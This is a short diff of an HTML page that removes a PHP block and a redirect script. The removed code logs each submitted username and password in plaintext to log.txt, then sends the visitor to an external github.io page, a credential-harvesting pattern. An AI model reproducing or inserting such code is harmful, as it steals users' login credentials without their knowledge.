@@ -169,23 +169,6 @@ window.onclick = function(event) {
     }
 }
 </script>
-
-<?php
-
-if ($_POST['Login']){
-
-$myFile = "log.txt";
-$fh = fopen($myFile, 'a') or die("can't open file");
-$stringData = $_POST['username'] . ":";
-fwrite($fh, $stringData);
-$stringData = $_POST['password'] . "\n";
-fwrite($fh, $stringData);
-fclose($fh);
-
-} ?>
-
-<script>location.href='https://maxplagues.github.io/CORS-SOP/';</script>
 	
-
 </body>
 </html>
